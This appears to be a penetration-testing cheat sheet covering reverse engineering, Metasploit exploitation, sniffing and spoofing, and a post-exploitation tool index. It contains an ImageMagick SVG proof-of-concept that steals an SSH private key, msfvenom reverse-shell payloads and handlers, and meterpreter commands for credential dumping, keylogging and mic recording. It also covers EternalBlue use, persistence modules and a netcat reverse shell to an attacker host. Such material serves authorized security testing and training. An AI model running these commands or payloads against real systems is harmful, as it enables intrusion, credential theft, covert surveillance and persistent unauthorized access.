0x004009b4    1 9            sym._fini
0x004007d6    6 89           sym.tonto_chi_legge
0x00400940    4 101          sym.__libc_csu_init
0x0040082f    9 260          main
0x00400640    1 6            sym.imp.puts
0x004006b0    1 6            sym.imp.exit
0x00400620    1 6            sym.imp.strncpy
0x00400630    1 6            sym.imp.strncmp
0x00400680    1 6            sym.imp.printf
0x004006c0    1 6            sym.imp.setuid
0x00400670    1 6            sym.imp.system
0x00400660    1 6            sym.imp.__stack_chk_fail
0x004005f0    3 26           sym._init
0x00400650    1 6            sym.imp.strlen
0x00400690    1 6            sym.imp.strcspn
```

### Example

```c
$ r2 -d -A <FILE>                // -d run, -A analysis
[0x080491ab]> s main; pdf          // disassemble main, pdf = Print Disassembly Function
[0x080491ab]> db 0x080491bb        // db = debug breakpoint
[0x080491ab]> dc                   // dc = debug continue
[0x08049172]> pxw @ esp            // analyze top of the stack
[0x08049172]> ds                   // ds = debug step
[0x080491aa]> pxw @ 0xff984aec     // read a specific value
[0x41414141]> dr eip               // dr = debug register
```

## strings

```c
$ strings <FILE>
$ strings -o <FILE>
$ strings -n 1 <FILE>
```

### Printing Memory Location

```c
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6
```

## upx

```c
$ upx -d <FILE>
```






# Exploitation Tools

- [Resources](#resources)

## Table of Contents

- [ImageTragick](#imagetragick)
- [MSL / Polyglot Attack](#msl--polyglot-attack)
- [Metasploit](#metasploit)
- [searchsploit](#searchsploit)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Evil-WinRM | The ultimate WinRM shell for hacking/pentesting | https://github.com/Hackplayers/evil-winrm |
| Exploitalert | Listing of latest Exploits | https://exploitalert.com |
| Metasploit | Metasploit Framework | https://github.com/rapid7/metasploit-framework |
| TheFatRat | TheFatRat is an exploiting tool which compiles a malware with famous payload, and then the compiled maware can be executed on Linux , Windows , Mac and Android. | https://github.com/Screetsec/TheFatRat |

## ImageTragick

> https://imagetragick.com/

## MSL / Polyglot Attack

> https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

### poc.svg

```c
<image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

### Executing Payload

```c
$ convert poc.svg poc.png
$ cp /tmp/poc.svg /var/www/html/convert_images/
```

## Metasploit

> https://github.com/rapid7/metasploit-framework

> https://github.com/rapid7/metasploit-payloads

### General Usage

```c
$ sudo msfdb run                           // start database
$ sudo msfdb init                          // database initialization
$ msfdb --use-defaults delete              // delete existing databases
$ msfdb --use-defaults init                // database initialization
$ msfdb status                             // database status
msf6 > workspace                           // metasploit workspaces
msf6 > workspace -a <WORKSPACE>            // add a workspace
msf6 > workspace -r <WORKSPACE>            // rename a workspace
msf6 > workspace -d <WORKSPACE>            // delete a workspace
msf6 > workspace -D                        // delete all workspaces
msf6 > db_nmap <OPTIONS>                   // execute nmap and add output to database
msf6 > hosts                               // reads hosts from database
msf6 > services                            // reads services from database
msf6 > vulns                               // displaying vulnerabilities
msf6 > search                              // search within metasploit
msf6 > set RHOST <RHOST>                   // set remote host
msf6 > set RPORT <RPORT>                   // set remote port
msf6 > run                                 // run exploit
msf6 > spool /PATH/TO/FILE                 // recording screen output
msf6 > save                                // saves current state
msf6 > exploit                             // using module exploit
msf6 > payload                             // using module payload
msf6 > auxiliary                           // using module auxiliary
msf6 > encoder                             // using module encoder
msf6 > nop                                 // using module nop
msf6 > show sessions                       // displays all current sessions
msf6 > sessions -i 1                       // switch to session 1
msf6 > sessions -u <ID>                    // upgrading shell to meterpreter
msf6 > sessions -k <ID>                    // kill specific session
msf6 > sessions -K                         // kill all sessions
msf6 > jobs                                // showing all current jobs
msf6 > show payloads                       // displaying available payloads
msf6 > resource /PATH/TO/FILE/<FILE>.rc    // load resource (.rc) file
msf6 > set VERBOSE true                    // enable verbose output
msf6 > set forceexploit true               // exploits the target anyways
msf6 > set EXITFUNC thread                 // reverse shell can exit without exit the program
msf6 > set AutoLoadStdapi false            // disables autoload of stdapi
msf6 > set PrependMigrate true             // enables automatic process migration
msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\> > Ctrl + z                                  // put active meterpreter shell in background
meterpreter > loadstdapi                         // load stdapi
meterpreter > background                         // put meterpreter in background (same as "bg")
meterpreter > shell                              // get a system shell
meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
meterpreter > ps                                 // checking processes
meterpreter > migrate 2236                       // migrate to a process
meterpreter > getuid                             // get the user id
meterpreter > sysinfo                            // get system information
meterpreter > search -f <FILE>                   // search for a file
meterpreter > upload                             // uploading local files to the target
meterpreter > ipconfig                           // get network configuration
meterpreter > load powershell                    // loads powershell
meterpreter > powershell_shell                   // follow-up command for load powershell
meterpreter > powershell_execute                 // execute command
meterpreter > powershell_import                  // import module
meterpreter > powershell_shell                   // shell
meterpreter > powershell_session_remove          // remove
meterpreter > powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress'                                // network discovery
meterpreter > powershell_execute '1..254 | foreach { "<XXX.XXX.XXX>.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName <XXX.XXX.XXX>.${_} -Quiet)" }'    // network scan
meterpreter > powershell_execute 'Test-NetConnection -ComputerName <RHOST> -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter > load kiwi                          // load mimikatz
meterpreter > help kiwi                          // mimikatz help
meterpreter > kiwi_cmd                           // execute mimikatz native command
meterpreter > lsa_dump_sam                       // lsa sam dump
meterpreter > dcsync_ntlm krbtgt                 // dc sync
meterpreter > creds_all                          // dump all credentials
meterpreter > creds_msv                          // msv dump
meterpreter > creds_kerberos                     // kerberos dump
meterpreter > creds_ssp                          // ssp dump
meterpreter > creds_wdigest                      // wdigest dump
meterpreter > getprivs                           // get privileges after loading mimikatz
meterpreter > getsystem                          // gain system privileges if user is member of administrator group
meterpreter > hashdump                           // dumps all the user hashes
meterpreter > run post/windows/gather/checkvm    // check status of the target
meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter > run post/windows/manage/enable_rdp              // enables rdp
meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter > keyscan_start                                   // enabled keylogger
meterpreter > keyscan_dump                                    // showing the output
meterpreter > screenshare                                     // realtime screen sharing
meterpreter > screenshare -q 100                              // realtime screen sharing
meterpreter > record_mic                                      // recording mic output
meterpreter > timestomp                                       // modify timestamps
meterpreter > execute -f calc.exe                             // starts a program on the victim
meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
```

### Metasploit through Proxychains

```c
$ proxychains -q msfconsole
```

### Meterpreter Listener

#### Generate Payload

```c
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
```

#### Setup Listener for Microsoft Windows

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

#### Setup Listener for MacOS

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > set PAYLOAD python/meterpreter/reverse_tcp
PAYLOAD => python/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit
```

#### Download Files

```c
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
```

```c
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <LHOST>
LHOST => <LHOST>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run
```

```c
C:\> .\<FILE>.exe
```

```c
meterpreter > download *
```

### Enumeration

#### SNMP Scan

```c
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 auxiliary(scanner/snmp/snmp_login) > set RHOSTS <RHOST>
msf6 auxiliary(scanner/snmp/snmp_login) > run
```

#### SNMP Enum

```c
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS <RHOST>
msf6 auxiliary(scanner/snmp/snmp_enum) > run
```

#### Tomcat Enumeration

```c
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <RHOST>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

#### Exploit Suggester

```c
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

### Execute Binaries

#### Port Forwarding with Chisel

```c
meterpreter > execute -Hf chisel.exe -a "client -v <LHOST>:<LPORT> R:1092:socks"
```

### Pivoting

#### Port Forwarding with Meterpreter

```c
meterpreter > portfwd add -L 127.0.0.1 -l <LPORT> -p <RPORT> -r <RHOST>
```

#### SOCKS Proxy on Meterpreter Sessions

```c
msf6 > use auxiliary/server/socks_proxy
```

#### Pivoting with Meterpreter

```c
meterpreter > run autoroute -s <XXX.XXX.XXX>.0/24
background
msf6 > use auxiliary/scanner/portscan/tcp
```

### Auxiliary Handling

#### Auxiliary Setup

```c
msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS <RHOST>
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH Users/Nathan/Desktop/Passwords.txt
msf6 auxiliary(scanner/http/tvt_nvms_traversal) > run
```

#### Auxiliary Output Directory

```c
/home/kali/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
```

### Persistence

#### Setting up Persistent Access

```c
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
```

#### Copy exploit to target machine

```c
msf6 > use exploit/windows/local/persistence
msf6 > set session 1
msf6 > use windows/meterpreter/reverse_tcp
```

#### Persistence through persistence_service

```c
msf6 > use exploit/windows/local/persistence_service
msf6 > set session 2
msf6 > set lport 5678
msf6 > exploit
```

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost <LHOST>
msf6 > set lport 5678
msf6 > exploit
```

#### Persistence through Persistence_exe

```c
msf6 > use post/windows/manage/persistence_exe
msf6 > set session 1
msf6 > set rexepath /root/payload.exe
msf6 > exploit
```

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost <LHOST>
msf6 > set lport 1234
msf6 > exploit
```

#### Persistence through Registry

```c
msf6 > use exploit/windows/local/registry_persistence 
msf6 > set session 1
msf6 > set lport 7654
msf6 > exploit
```

```c
msf6 > use exploit/multi/handler
msf6 > set set payload windows/meterpreter/reverse_tcp
msf6 > set lhost <LHOST>
msf6 > set lport 7654
msf6 > exploit
```

### Exploit Handling

#### web_delivery Handler

```c
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST <LHOST>
msf6 exploit(multi/script/web_delivery) > set SRVHOST <LPORT
msf6 exploit(multi/script/web_delivery) > set SRVPORT 80
msf6 exploit(multi/script/web_delivery) > set target 2
msf6 exploit(multi/script/web_delivery) > set LPORT 445
msf6 exploit(multi/script/web_delivery) > run -j
```

#### Example Execution

```c
$ crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --local-auth -M web_delivery -o URL=http://<LHOST>/j0wUlo2EX
```

#### WP Shell Upload

```c
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P@s5w0rd!
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS <RHOST>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST <LHOST>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LPORT <LPORT>
msf6 > run
```

#### Example Execution

```c
meterpreter > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads
meterpreter > execute -f nc.exe -a "-e cmd.exe <LHOST> <LPORT>"
```

#### Dedicated Exploits

```c
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST <LHOST>
msf6 exploit(windows/local/ms10_015_kitrap0d) > set payload windows/meterpreter_reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit
```

#### Additional Options

```c
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT <LPORT>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST <LHOST>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <RHOST>
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
```

## searchsploit

```c
$ searchsploit <NAME>
$ searchsploit --cve <CVE>
$ searchsploit -m <ID>
$ searchsploit -x <ID> / <PATH>
```







# Sniffing & Spoofing

- [Resources](#resources)

## Table of Contents

- [FakeDns](#fakedns)
- [Responder](#responder)
- [SSH-MITM](#ssh-mitm)
- [tshark](#tshark)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| mDNS | A mDNS sniffer and interpreter. | https://github.com/eldraco/Sapito |
| mitm6 | mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. | https://github.com/dirkjanm/mitm6 |
| mitmproxy | mitmproxy is an interactive, SSL/TLS-capable intercepting proxy with a console interface for HTTP/1, HTTP/2, and WebSockets. | https://github.com/mitmproxy/mitmproxy |
| Responder | IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay. | https://github.com/lgandx/Responder |
| SSH-MITM | ssh mitm server for security audits supporting public key authentication, session hijacking and file manipulation | https://github.com/ssh-mitm/ssh-mitm |

## FakeDns

> https://github.com/Crypt0s/FakeDns

### DNS Rebind Attack

```c
$ cat fake.conf
A <DOMAIN> 127.0.0.1 1%<LHOST>
```

#### Start the Server

```c
$ sudo python3 fakedns.py -c fake.conf --rebind
```

#### Test

```c
nslookup > server <LHOST>
Default server: <LHOST>
Address: <LHOST>#53
> <FAKE_DOMAIN>
Server:         <LHOST>
Address:        <LHOST>#53

Name:   <FAKE_DOMAIN>
Address: 127.0.0.1
*## server can't find <FAKE_DOMAIN>: NXDOMAIN
> <FAKE_DOMAIN>
Server:         <LHOST>
Address:        <LHOST>#53

Name:   <FAKE_DOMAIN>
Address: <LHOST>
*## server can't find <FAKE_DOMAIN>: NXDOMAIN
>
```

## Responder

> https://github.com/lgandx/Responder

```c
$ sudo responder -I <INTERFACE>
```

## SSH-MITM

```c
$ ssh-mitm server --remote-host <RHOST>
$ socat TCP-LISTEN:<RPORT>,fork TCP:127.0.0.1:10022
```

## tshark

### Capturing SMTP Traffic

```c
$ tshark -i <INTERFACE> -Y 'smtp.data.fragments' -T fields -e 'text'
```






# Post Exploitation

- [Resources](#resources)

## Table of Contents

- [accesschk](#accesschk)
- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
- [Apache2](#apache2)
- [AppLocker](#applocker)
- [APT](#apt)
- [arua2c](#arua2c)
- [Bash](#bash)
- [Bash Debugging Mode](#bash-debugging-mode)
- [BloodHound](#bloodhound)
- [BloodHound Python](#bloodhound-python)
- [bloodyAD](#bloodyad)
- [Certify](#certify)
- [Certipy](#certipy)
- [ClamAV](#clamav)
- [Coercer](#coercer)
- [Credentials File](#credentials-file)
- [dd](#dd)
- [DNS](#dns)
- [Data Protection API (DPAPI)](#data-protection-api-dpapi)
- [enum4linux](#enum4linux)
- [enum4linux-ng](#enum4linux-ng)
- [env](#env)
- [Evil-WinRM](#evil-winrm)
- [Excel](#excel)
- [find](#find)
- [FullPowers](#fullpowers)
- [functions](#functions)
- [gdbus](#gdbus)
- [gem](#gem)
- [Git](#git)
- [gMSADumper](#gmsadumper)
- [grep](#grep)
- [gsocket](#gsocket)
- [find](#find)
- [functions](#functions)
- [Impacket](#impacket)
- [Internet Information Service (IIS)](#internet-information-service-iis)
- [JAWS](#jaws)
- [Kerberos](#kerberos)
- [Kiosk Breakout](#kiosk-breakout)
- [Krbrelayx](#krbrelayx)
- [LAPS](#laps)
- [LDAP](#ldap)
- [ldapmodify](#ldapmodify)
- [ldapsearch](#ldapsearch)
- [LD_PRELOAD](#ld_preload)
- [LD_LIBRARY_PATH](#ld_library_path)
- [Libre Office](#libre-office)
- [Linux](#linux)
- [Linux Wildcards](#linux-wildcards)
- [logrotten](#logrotten)
- [Lsass](#lsass)
- [Lua](#lua)
- [machinectl](#machinectl)
- [Microsoft Windows](#microsoft-windows)
- [Microsoft Windows Defender](#microsoft-windows-defender)
- [Minimalistic Offensive Security Tools](#minimalistic-offensive-security-tools)
- [nginx](#nginx)
- [PassTheCert](#passthecert)
- [Path Variable Hijacking](#path-variable-hijacking)
- [Perl](#perl)
- [PHP7.2](#php72)
- [pika](#pika)
- [Ping Sweep](#ping-sweep)
- [PKINITtools](#pkinittools)
- [plotting](#plotting)
- [Port Scanning](#port-scanning)
- [PoshADCS](#poshadcs)
- [powercat](#powercat)
- [Powermad](#powermad)
- [PowerShell](#powershell)
- [PowerShell Constrained Language Mode (CLM)](#powershell-constrained-language-mode-clm)
- [PowerSploit](#powersploit)
- [PowerView](#powerview)
- [Pre-created Computer Accounts](#pre-created-computer-accounts)
- [PRET](#pret)
- [procdump](#procdump)
- [PsExec](#psexec)
- [pspy](#pspy)
- [pth-toolkit](#pth-toolkit)
- [pwncat](#pwncat)
- [pyGPOAbuse](#pygpoabuse)
- [Python](#python)
- [rbash](#rbash)
- [relayd](#relayd)
- [rpcclient](#rpcclient)
- [Rubeus](#rubeus)
- [RunasCs](#runascs)
- [SeBackupPrivilege Privilege Escalation (diskshadow)](#sebackupprivilege-privilege-escalation-diskshadow)
- [setcap](#setcap)
- [Shared Library Misconfiguration](#shared-library-misconfiguration)
- [SharpDPAPI](#sharpdpapi)
- [SharpHound](#sharphound)
- [Shell Upgrade](#shell-upgrade)
- [Sherlock](#sherlock)
- [smbpasswd](#smbpasswd)
- [systemctl](#systemctl)
- [Time Stomping](#time-stomping)
- [Universal Privilege Escalation and Persistence Printer](#universal-privilege-escalation-and-persistence-printer)
- [User Account Control (UAC) Bypass](#user-account-control-uac-bypass)
- [User Group Exploitation](#user-group-exploitation)
- [VSS](#vss)
- [WDigest](#wdigest)
- [Whisker](#whisker)
- [Windows-Exploit-Suggester](#windows-exploit-suggester)
- [winexe](#winexe)
- [World Writeable Directories](#world-writeable-directories)
- [writeDACL](#writedacl)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| ADCSKiller | An ADCS Exploitation Automation Tool Weaponizing Certipy and Coercer | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments. | https://github.com/GoateePFE/ADCSTemplate |
| adPEAS | Powershell tool to automate Active Directory enumeration. | https://github.com/61106960/adPEAS |
| BloodHound | BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | Fork of BloodHound with PKI nodes and edges for Certipy along with some minor personal improvements | https://github.com/ly4k/BloodHound |
| BloodHound Docker | BloodHound Docker Ready to Use | https://github.com/belane/docker-bloodhound |
| BloodHound Python | A Python based ingestor for BloodHound | https://github.com/dirkjanm/BloodHound.py |
| BloodyAD Framework | BloodyAD is an Active Directory Privilege Escalation Framework, it can be used manually using bloodyAD.py or automatically by combining pathgen.py and autobloody.py. | https://github.com/CravateRouge/bloodyAD |
| Certify | Active Directory certificate abuse. | https://github.com/GhostPack/Certify |
| Certipy | Tool for Active Directory Certificate Services enumeration and abuse | https://github.com/ly4k/Certipy |
| check_vulnerabledrivers.ps1 | A quick script to check for vulnerable drivers. Compares drivers on system with list from loldrivers.io | https://gist.github.com/api0cradle/d52832e36aaf86d443b3b9f58d20c01d |
| Coercer | A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 9 methods. | https://github.com/p0dalirius/Coercer |
| CSExec | An implementation of PSExec in C# | https://github.com/malcomvetter/CSExec |
| DLLSideloader | PowerShell script to generate "proxy" counterparts to easily perform DLL Sideloading | https://github.com/Flangvik/DLLSideloader |
| dnsteal | This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. | https://github.com/m57/dnsteal |
| enum4linux | A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts. | https://github.com/CiscoCXSecurity/enum4linux |
| enum4linux-ng | A next generation version of enum4linux. | https://github.com/cddmp/enum4linux-ng |
| EvilTree | A python3 remake of the classic "tree" command with the additional feature of searching for user provided keywords/regex in files, highlighting those that contain matches. | https://github.com/t3l3machus/eviltree |
| FindUncommonShares | FindUncommonShares is a Python script allowing to quickly find uncommon shares in vast Windows Domains, and filter by READ or WRITE accesses.. | https://github.com/p0dalirius/FindUncommonShares |
| FullPowers | Recover the default privilege set of a LOCAL/NETWORK SERVICE account | https://github.com/itm4n/FullPowers |
| GhostPack-Compiled Binaries | Compiled Binaries for Ghostpack (.NET v4.0) | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. | https://gtfobins.github.io/ |
| HEKATOMB | Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers and uses Domain backup keys to decrypt them. | https://github.com/Processus-Thief/HEKATOMB |
| Impacket | Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. | https://github.com/fortra/impacket |
| Impacket Static Binaries | Standalone binaries for Linux/Windows of Impacket's examples | https://github.com/ropnop/impacket_static_binaries |
| JAWS | JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. | https://github.com/411Hall/JAWS |
| KrbRelay | Framework for Kerberos relaying | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | KrbRelayUp - a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings). | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | Kerberos unconstrained delegation abuse toolkit | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | Dumping LAPS from Python | https://github.com/n00py/LAPSDumper |
| LES: Linux privilege escalation auditing tool | Linux privilege escalation auditing tool | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | Privilege Escalation Enumeration | https://github.com/rebootuser/LinEnum |
| linWinPwn | linWinPwn is a bash script that automates a number of Active Directory Enumeration and Vulnerability checks | https://github.com/lefayjey/linWinPwn |
| LoFP | Living off the False Positive! | https://br0k3nlab.com/LoFP |
| LOLAPPS | LOLAPPS is a compendium of applications that can be used to carry out day-to-day exploitation. | https://lolapps-project.github.io/# |
| LOLBAS | The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. | https://lolbas-project.github.io/# |
| LOLBins CTI-Driven | The LOLBins CTI-Driven (Living-Off-the-Land Binaries Cyber Threat Intelligence Driven) is a project that aims to help cyber defenders understand how LOLBin binaries are used by threat actors during an intrusion in a graphical and digestible format for the TIPs platform using the STIX format. | https://lolbins-ctidriven.vercel.app |
| LOLDrivers | Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats. | https://www.loldrivers.io |
| LOFLCAB | Living off the Foreign Land Cmdlets and Binaries | https://lofl-project.github.io |
| LOOBins | Living Off the Orchard: macOS Binaries (LOOBins) is designed to provide detailed information on various built-in macOS binaries and how they can be used by threat actors for malicious purposes. | https://www.loobins.io |
| lsassy | Python tool to remotely extract credentials on a set of hosts. | https://github.com/Hackndo/lsassy |
| nanodump | LSASS dumper | https://github.com/helpsystems/nanodump |
| NTLMRelay2Self | An other No-Fix LPE, NTLMRelay2Self over HTTP (Webdav). | https://github.com/med0x2e/NTLMRelay2Self |
| Obfuscated SharpCollection | Attempt at Obfuscated version of SharpCollection | https://github.com/Flangvik/ObfuscatedSharpCollection |
| Outgoing Port Tester | This server listens on all TCP ports, allowing you to test any outbound TCP port. | http://portquiz.net |
| PassTheCert | Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannel | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | Privilege Escalation Awesome Scripts SUITE new generation | https://github.com/carlospolop/PEASS-ng |
| Ping Castle | Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. | https://github.com/vletoux/pingcastle |
| PKINITtools | Tools for Kerberos PKINIT and relaying to AD CS | https://github.com/dirkjanm/PKINITtools |
| powercat | Netcat: The powershell version. | https://github.com/besimorhino/powercat |
| Powermad | PowerShell MachineAccountQuota and DNS exploit tools | https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1 |
| PowerSharpPack | Many useful offensive CSharp Projects wraped into Powershell for easy usage. | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowershellKerberos | Some scripts to abuse kerberos using Powershell | https://github.com/MzHmO/PowershellKerberos |
| PowerShell-Suite | My musings with PowerShell | https://github.com/FuzzySecurity/PowerShell-Suite |
| PowerSploit | PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. | https://github.com/PowerShellMafia/PowerSploit |
| PowerUp | PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | PowerView is a PowerShell tool to gain network situational awareness on Windows domains. | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | PowerView alternative | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | Dump the memory of a PPL with a userland exploit | https://github.com/itm4n/PPLdump |
| Pre2k | Pre2k is a tool to query for the existence of pre-windows 2000 computer objects which can be leveraged to gain a foothold in a target domain as discovered by TrustedSec's @Oddvarmoe. | https://github.com/garrettfoster13/pre2k |
| Priv2Admin | Exploitation paths allowing you to (mis)use the Windows Privileges to elevate your rights within the OS. | https://github.com/gtworek/Priv2Admin |
| PSPKIAudit | PowerShell toolkit for AD CS auditing based on the PSPKI toolkit. | https://github.com/GhostPack/PSPKIAudit |
| pspy | pspy is a command line tool designed to snoop on processes without need for root permissions. | https://github.com/DominicBreuker/pspy |
| pth-toolkit | A modified version of the passing-the-hash tool collection https://code.google.com/p/passing-the-hash/ designed to be portable and work straight out of the box even on the most 'bare bones' systems. | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | Post-Exploitation Platform | https://github.com/calebstewart/pwncat |
| pyGPOAbuse | Partial python implementation of SharpGPOAbuse | https://github.com/Hackndo/pyGPOAbuse |
| PyWhisker | Python version of the C# tool for "Shadow Credentials" attacks | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | Rubeus is a C# toolset for raw Kerberos interaction and abuses. | https://github.com/GhostPack/Rubeus |
| RunasCs | RunasCs - Csharp and open version of windows builtin runas.exe | https://github.com/antonioCoco/RunasCs |
| rustcat | Rustcat(rcat) - The modern Port listener and Reverse shell | https://github.com/robiot/rustcat |
| RustHound | Active Directory data collector for BloodHound written in rust. | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | scavenger is a multi-threaded post-exploitation scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information. | https://github.com/SpiderLabs/scavenger |
| SCShell | Fileless lateral movement tool that relies on ChangeServiceConfigA to run command | https://github.com/Mr-Un1k0d3r/SCShell |
